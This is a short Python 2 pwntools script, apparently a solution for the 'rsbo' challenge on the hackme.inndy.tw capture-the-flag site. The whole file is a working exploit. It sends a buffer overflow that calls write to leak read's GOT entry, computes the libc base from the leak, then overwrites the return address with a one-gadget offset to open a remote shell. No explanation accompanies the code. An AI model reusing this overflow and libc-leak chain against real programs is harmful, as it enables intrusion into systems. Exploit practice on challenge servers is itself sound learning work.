#!/usr/bin/env python2

from pwn import *
context.log_level = 'debug'

#p = process('rsbo')
p = remote('hackme.inndy.tw', 7706)
e = ELF('rsbo')
libc = ELF('libc-2.23.so.i386')

#Stage 1 (leak read)
payload = '\x00'*108
payload += p32(e.symbols['write']) + p32(e.symbols['_start']) + p32(1) + p32(e.got['read']) + p32(4)
p.send(payload)
libc_base = u32(p.recv(4)) - libc.symbols['read']
print '[+]Libc base at: {}'.format(hex(libc_base))

payload = '\x00'*108
payload += p32(libc_base + 0x5faa5)
p.send(payload)

p.interactive()
p.close()
